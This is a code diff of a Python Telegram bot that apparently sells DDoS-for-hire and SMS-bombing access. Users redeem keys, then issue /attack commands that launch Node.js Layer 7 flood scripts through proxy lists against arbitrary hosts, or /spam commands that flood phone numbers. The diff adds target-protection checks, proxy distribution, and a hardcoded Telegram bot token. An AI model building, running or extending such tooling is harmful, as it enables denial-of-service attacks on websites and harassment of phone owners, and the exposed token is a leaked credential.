@@ -1,4 +1,4 @@
-import telebot
+﻿import telebot
 import datetime
 import time
 import os
@@ -14,13 +14,17 @@ import io
 import re
 import threading
 
+# Uptime PART
 from server import alive
 alive()
 
-bot_token = '6508337693:AAEy5Vlirw5hPG2EWW3wP7bEYrltfhhhW-U'
 
+bot_token = '6508337693:AAEy5Vlirw5hPG2EWW3wP7bEYrltfhhhW-U' 
 bot = telebot.TeleBot(bot_token)
 
+allowed_users = []
+processes = []
+ADMIN_ID = 5111191060
 proxy_update_count = 0
 last_proxy_update_time = time.time()
 
@@ -54,16 +58,15 @@ def save_user_to_database(connection, user_id, expiration_time):
         VALUES (?, ?)
     ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
     connection.commit()
-    
 @bot.message_handler(commands=['add'])
 def add_user(message):
     admin_id = message.from_user.id
     if admin_id != ADMIN_ID:
-        bot.reply_to(message, 'You dont have permission to use this command.')
+        bot.reply_to(message, 'This command only for Admin')
         return
 
     if len(message.text.split()) == 1:
-        bot.reply_to(message, 'Use correct : /add + [id]')
+        bot.reply_to(message, 'Use correct syntax /add + [id]')
         return
 
     user_id = int(message.text.split()[1])
@@ -73,34 +76,126 @@ def add_user(message):
     save_user_to_database(connection, user_id, expiration_time)
     connection.close()
 
-    bot.reply_to(message, f'Added {user_id}. Can use command for 30 days.')
+    bot.reply_to(message, f'Added user with ID: {user_id} Can now use the DDOS Attack for 30 days')
+
 
 load_users_from_database()
 
+@bot.message_handler(commands=['getkey'])
+def laykey(message):
+    with open('key.txt', 'a') as f:
+        f.close()
+
+    username = message.from_user.username
+    string = f'GL-{username}+{TimeStamp()}'
+    hash_object = hashlib.md5(string.encode())
+    key = str(hash_object.hexdigest())
+    print(key)
+    
+    try:
+        response = requests.get(f'https://link4m.co/api-shorten/v2?api=650052128c48484de71ab0ef&url=https://viduchung.info/key/?key={key}')
+        response_json = response.json()
+        if 'shortenedUrl' in response_json:
+            url_key = response_json['shortenedUrl']
+        else:
+            url_key = "Error, please use again command /getkey"
+    except requests.exceptions.RequestException as e:
+        url_key = "Error, please use again command /getkey"
+    
+    text = f'''
+━➤ Done Get Key
+━➤ Follow this link to get your Key: {url_key}
+    '''
+    bot.reply_to(message, text)
+
+@bot.message_handler(commands=['key'])
+def key(message):
+    if len(message.text.split()) == 1:
+        bot.reply_to(message, 'Please enter your key')
+        return
+
+    user_id = message.from_user.id
+
+    key = message.text.split()[1]
+    username = message.from_user.username
+    string = f'GL-{username}+{TimeStamp()}'
+    hash_object = hashlib.md5(string.encode())
+    expected_key = str(hash_object.hexdigest())
+    if key == expected_key:
+        allowed_users.append(user_id)
+        bot.reply_to(message, 'Key accepted! You now can order an attack!')
+    else:
+        bot.reply_to(message, 'Wrong key or expired\nDo not use others key!')
 @bot.message_handler(commands=['start', 'help'])
 def help(message):
-    help_text = '''
-[ 👻 ]   Welcome to Fracxi | 
-        " /methods "Show all available Layer7 methods"
-       [ ✔️ ]   Admin : D4XG | 
-'''
-    bot.reply_to(message, help_text)
-    
+    help_text = '''  
+[ 🗝️ ] Key panel
+ - /getkey : To get free key
+ - /key <key> : To enter free key
 
+[ ⚡ ] Attack panel
+ - /methods : To see list of DDOS/SpamSMS methods
+ - /spam <phone number> : Start phone spam
+ - /attack <method> <target> <time> : Perfrom a DDOS attack
+
+[ 🔧 ] Tools panel
+ - /check <target> : Check Protect system of target ( Lack of % )
+ - /code <target> : Get target source code
+ - /proxy : Control bot proxies
+ - /getproxy : Get new list of proxies after 10 minutes
+ - /time : Get bot uptime data
+ - /admin : See Admin activity
+
+[ 👨‍💻 ] Admin Permission
+ - /cpu : See BOT CPU Stats
+ - /on : Turn on maintenance
+ - /off : Turn off maintenance
+'''
+    image_path = 'BB/help.png'
+    with open(image_path, 'rb') as image_file:
+        bot.send_photo(chat_id=message.chat.id, photo=image_file, caption=help_text, reply_to_message_id=message.message_id)
+@bot.message_handler(commands=['tmute'])
+def tmute(message):
+    pass
+@bot.message_handler(commands=['muakey'])
+def muakey(message):
+    pass
+@bot.message_handler(commands=['nhapkey'])
+def nhapkeyvip(message):
+    pass
+@bot.message_handler(commands=['vip'])
+def vipsms(message):
+    pass
+@bot.message_handler(commands=['ddos'])
+def didotv(message):
+    pass
+@bot.message_handler(commands=['setflood'])
+def aygspws(message):
+    pass
 @bot.message_handler(commands=['methods'])
 def methods(message):
     help_text = '''
-[ 💸 ]   All Layer7 Methods ! 
+[ 👑 ]   All Layer7 Methods ! 
      - PLUTO
-     - PLUTO-CANON
+     - VOIDLASH
      - FRIXIZ
      - OPIUM
      - GLAXIA
      - POSEIDON
      - ZENITH
-[ 📎 ]   ATTACK ? [ " /attack " + method + target + duration ]  !
+
+[ ⚜️ ]   All Layer4 Methods !
+     - UDP
+     - TCP-KILLER
+
+[ 💎 ]   Spam SMS
+     - /spam <phone number>
+
+[ 📎 ]   ATTACK ?\n Layer 7 | /attack [ method ] [ host ] [ duration ]\n Layer 4 | /attack [ method ] [ ip ] [ port ] [ time ]
 '''
-    bot.reply_to(message, help_text)
+    image_path = 'BB/methods.png'
+    with open(image_path, 'rb') as image_file:
+        bot.send_photo(chat_id=message.chat.id, photo=image_file, caption=help_text, reply_to_message_id=message.message_id)
 
 allowed_users = []  # Define your allowed users list
 cooldown_dict = {}
@@ -130,9 +225,17 @@ def run_attack(command, duration, message):
 
 @bot.message_handler(commands=['attack'])
 def attack_command(message):
+    user_id = message.from_user.id
+    if not is_bot_active:
+        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you  have any issues')
+        return
+    
+    if user_id not in allowed_users:
+        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key\nBuy your own key: @prifxz')
+        return
 
     if len(message.text.split()) < 3:
-        bot.reply_to(message, '[ 👻 ]   How to attack |  : /attack + [ Methods ] + [ Host ] + [ Duration ]')
+        bot.reply_to(message, '[ 👻 ]   How to attack:\n Layer 7 | /attack [method] [host] [duration]\n [ Maintenace ] Layer 4 | /attack [method] [ip] [port] ')
         return
 
     username = message.from_user.username
@@ -140,7 +243,7 @@ def attack_command(message):
     current_time = time.time()
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
         remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"Please wait {remaining_time}s To use the command again!")
+        bot.reply_to(message, f"@{username}! Please wait {remaining_time}s To use the command again!")
         return
     
     args = message.text.split()
@@ -148,55 +251,311 @@ def attack_command(message):
     host = args[2]
     atime = args[3]
 
+    #Attack Area
     blocked_domains = ["chinhphu.vn", "daxg.space", ".edu.vn", ".gov"]   
-    if method == 'PLUTO' or method == 'POSEIDON' or method == 'ZENITH' or method == 'PLUTO-CANON' or method == 'GLAXIA' or method == 'FRIXIZ' or method == 'OPIUM':
+    if method == 'PLUTO' or method == 'POSEIDON' or method == 'ZENITH' or method == 'GLAXIA' or method == 'FRIXIZ' or method == 'OPIUM' or method == 'VOIDLASH':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
                 bot.reply_to(message, f"[ 🚀 ]  Cannot perform the attack | Blocked domain: {blocked_domain}")
                 return
 
-    if method in ['PLUTO', 'PLUTO-CANON', 'POSEIDON', 'ZENITH', 'GLAXIA', 'FRIXIZ', 'OPIUM']:
+    if method in ['PLUTO', 'POSEIDON', 'ZENITH', 'GLAXIA', 'FRIXIZ', 'OPIUM', 'VOIDLASH']:
         # Update the command and duration based on the selected method
         if method == 'PLUTO':
             os.chdir("L7")
             command = ["node", "Pluto.js", host, atime, "200", "14", "proxy.txt", "bypass"]
             duration = atime
-        if method == 'PLUTO-CANON':
+        if method == 'VOIDLASH':
             os.chdir("L7")
-            command = ["node", "Pluto.js", host, atime, "200", "14", "proxy.txt", "flood"]
+            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "14"]
             duration = atime
-        if method == 'POSEIDON':
+        elif method == 'POSEIDON':
             os.chdir("L7")
             command = ["node", "Poseidon.js", host, atime, "12", "proxy.txt", "autorate"]
             duration = atime
-        if method == 'OPIUM':
+        elif method == 'OPIUM':
             os.chdir("L7")
             command = ["node", "Opium.js", host, atime, "100", "12", "GET", "proxy.txt"]
             duration = atime
-        if method == 'ZENITH':
+        elif method == 'ZENITH':
             os.chdir("L7")
             command = ["node", "Zenith.js", host, atime, "100", "12", "proxy.txt"]
             duration = atime
-        if method == 'FRIXIZ':
+        elif method == 'FRIXIZ':
             os.chdir("L7")
             command = ["node", "Frixiz.js", host, atime, "15", "12", "proxy.txt"]
             duration = atime
-        if method == 'GLAXIA':
+        elif method == 'GLAXIA':
             os.chdir("L7")
             command = ["node", "Glaxia.js", host, atime, "64", "12", "proxy.txt"]
             duration = atime
+   #     elif method == 'UDP-FLOOD':
+   #         if not port.isdigit():
+   #             bot.reply_to(message, 'Port phải là một số nguyên dương.')
+   #             return
+   #         os.chdir("L4")
+   #         command = ["python", "udp.py", host, port, "120", "64", "35"]
+   #         duration = 120
+   #     elif method == 'TCP-KILL':
+   #         if not atime.isdigit():
+   #             bot.reply_to(message, 'Port must be a positive number.')
+   #             return
+   #         os.chdir("L4")
+   #         command = ["python", "tcp.py", host, port, "1000", "12", atime]
+   #         duration = atime
 
         cooldown_dict[username] = {'attack': current_time}
 
         attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
         attack_thread.start()
-        bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent To Host : {host} | Duration : {duration} (s) !')
+        bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by {username}\n  - Target: {host}\n  - Duration: {duration}s\n - Method: {method}\n  - Cooldown: 120s\n  ┗➤ Plan: VIP')
     else:
-        bot.reply_to(message, 'Attack Not Indival Methods Layer 7.')
+        bot.reply_to(message, 'Attack Not Indival Methods. Please use /methods to see attacking methods!')
+
+
+@bot.message_handler(commands=['proxy'])
+def proxy_command(message):
+    user_id = message.from_user.id
+    if user_id in allowed_users:
+        try:
+            with open("L7/proxy.txt", "r") as proxy_file:
+                proxies = proxy_file.readlines()
+                num_proxies = len(proxies)
+                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
+        except FileNotFoundError:
+            bot.reply_to(message, "Cannot find proxy.txt.")
+    else:
+        bot.reply_to(message, 'Please apply your key\nPlease use /getkey to get your own key')
+
+def send_proxy_update():
+    while True:
+        try:
+            with open("proxy.txt", "r") as proxy_file:
+                proxies = proxy_file.readlines()
+                num_proxies = len(proxies)
+                proxy_update_message = f"Total proxied updated: {num_proxies}"
+                bot.send_message(allowed_group_id, proxy_update_message)
+        except FileNotFoundError:
+            pass
+        time.sleep(3600)  # Wait for 10 minutes
+
+@bot.message_handler(commands=['cpu'])
+def check_cpu(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, 'You dont have permission to use this command..')
+        return
+
+    cpu_usage = psutil.cpu_percent(interval=1)
+    memory_usage = psutil.virtual_memory().percent
+
+    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')
+
+@bot.message_handler(commands=['off'])
+def turn_off(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, 'You dont have permission to use this command..')
+        return
+
+    global is_bot_active
+    is_bot_active = False
+    bot.reply_to(message, 'The bot has entered maintenance mode. Everyone will now not be able to use the bot')
+
+@bot.message_handler(commands=['on'])
+def turn_on(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        bot.reply_to(message, 'You dont have permission to use this command..')
+        return
+
+    global is_bot_active
+    is_bot_active = True
+    bot.reply_to(message, 'Maintenance mode has ended. Everyone can use it normally again')
+
+is_bot_active = True
+@bot.message_handler(commands=['code'])
+def code(message):
+    user_id = message.from_user.id
+    if not is_bot_active:
+        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you  have any issues')
+        return
+    
+    if user_id not in allowed_users:
+        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key')
+        return
+    if len(message.text.split()) != 2:
+        bot.reply_to(message, 'Please use correct syntax.\nExample: /code + [target]')
+        return
+
+    url = message.text.split()[1]
+
+    try:
+        response = requests.get(url)
+        if response.status_code != 200:
+            bot.reply_to(message, 'Cannot get this website source code. Please check the input again!')
+            return
+
+        content_type = response.headers.get('content-type', '').split(';')[0]
+        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
+            bot.reply_to(message, 'The website is not HTML or PHP. Please try with a website URL containing HTML or PHP files.')
+            return
+
+        source_code = response.text
+
+        zip_file = io.BytesIO()
+        with zipfile.ZipFile(zip_file, 'w') as zipf:
+            zipf.writestr("source_code.txt", source_code)
+
+        zip_file.seek(0)
+        bot.send_chat_action(message.chat.id, 'upload_document')
+        bot.send_document(message.chat.id, zip_file)
+
+    except Exception as e:
+        bot.reply_to(message, f'Error: {str(e)}')
+
+@bot.message_handler(commands=['check'])
+def check_ip(message):
+    if len(message.text.split()) != 2:
+        bot.reply_to(message, 'Please use correct syntax.\nExample: /check + [target]')
+        return
+
+    url = message.text.split()[1]
+    
+    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+
+    # Loại bỏ tiền tố "www" nếu có
+    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
+    
+    try:
+        ip_list = socket.gethostbyname_ex(url)[2]
+        ip_count = len(ip_list)
+
+        reply = f"IP : {url}\nLà: {', '.join(ip_list)}\n"
+        if ip_count == 1:
+            reply += "This website may not have AntiDDOS system"
+        else:
+            reply += "This website may have a great AntiDDOS system"
+
+        bot.reply_to(message, reply)
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(commands=['admin'])
+def send_admin_link(message):
+    bot.reply_to(message, "Telegram: https://t.me/prifxz")
+
+# Hàm tính thời gian hoạt động của bot
+start_time = time.time()
+
+proxy_update_count = 0
+proxy_update_interval = 600 
+
+@bot.message_handler(commands=['getproxy'])
+def get_proxy_info(message):
+    user_id = message.from_user.id
+    global proxy_update_count
+
+    if not is_bot_active:
+        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you  have any issues')
+        return
+    
+    if user_id not in allowed_users:
+        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key')
+        return
+
+    try:
+        with open("./L7/proxy.txt", "r") as proxy_file:
+            proxy_list = proxy_file.readlines()
+            proxy_list = [proxy.strip() for proxy in proxy_list]
+            proxy_count = len(proxy_list)
+            proxy_message = f'Auto update after 10 minutes\n Total Proxies: {proxy_count}\n'
+            bot.send_message(message.chat.id, proxy_message)
+            bot.send_document(message.chat.id, open("./L7/proxy.txt", "rb"))
+            proxy_update_count += 1
+    except FileNotFoundError:
+        bot.reply_to(message, "Cannot find proxy.txt.")
+
+
+@bot.message_handler(commands=['time'])
+def show_uptime(message):
+    current_time = time.time()
+    uptime = current_time - start_time
+    hours = int(uptime // 3600)
+    minutes = int((uptime % 3600) // 60)
+    seconds = int(uptime % 60)
+    uptime_str = f'{hours} hour(s), {minutes} minute(s), {seconds} secs'
+    bot.reply_to(message, f'Uptime: {uptime_str}')
+
+allowed_users = []  # Define your allowed users list
+cooldown_dict = {}
+is_bot_active = True
+
+def run_sms(command, duration, message):
+    cmd_process = subprocess.Popen(command)
+    start_time = time.time()
+    
+    while cmd_process.poll() is None:
+        # Check CPU usage and terminate if it's too high for 10 seconds
+        if psutil.cpu_percent(interval=1) >= 1:
+            time_passed = time.time() - start_time
+            if time_passed >= 120:
+                cmd_process.terminate()
+                bot.reply_to(message, "[ 💤 ]   Attack Stopped.")
+                return
+        # Check if the attack duration has been reached
+        if time.time() - start_time >= duration:
+            cmd_process.terminate()
+            cmd_process.wait()
+            return
+
+
+@bot.message_handler(commands=['spam'])
+def attack_command(message):
+    user_id = message.from_user.id
+    
+    if not is_bot_active:
+        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you have any issues')
+        return
+    
+    if user_id not in allowed_users:
+        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key')
+        return
+
+    if len(message.text.split()) < 2:
+        bot.reply_to(message, 'Please use the correct syntax.\nExample: /spam <phone number>')
+        return
+
+    username = message.from_user.username
+
+    args = message.text.split()
+    phone_number = args[1]
+
+    blocked_numbers = ['113', '114', '115', '198', '911']
+    if phone_number in blocked_numbers:
+        bot.reply_to(message, 'Cannot spam this numbers.')
+        return
+
+    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
+        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
+        bot.reply_to(message, f'Please wait {remaining_time}s To use the command again!')
+        return
+    
+    cooldown_dict[user_id] = time.time()
+
+    # Define the attack command and duration here
+    os.chdir("L4")
+    command = ["python", "sms.py", phone_number, "120"]
+    duration = 120
+
+    attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
+    attack_thread.start()
+    bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by @{username}\n  - Target: {phone_number}\n  - Duration: 120s\n - Method: Phone Bulk\n  - Cooldown: 120s\n  ┗➤ Plan: VIP')
 
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
-    bot.reply_to(message, 'Admin : t.me/prifxz |')
+    bot.reply_to(message, 'Invalid command! Please use the /help command to see the command list.')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
-# npm i user-agents header-generator request fake-useragent randomstring colors axios cheerio gradient-string cloudscraper random-useragent crypto-random-string playwright-extra fingerprint-generator fingerprint-injector ua-parser-js http2 minimist socks puppeteer hcaptcha-solver puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth http http2 zombie random-referer jar xmlhttprequest vm set-cookie-parser
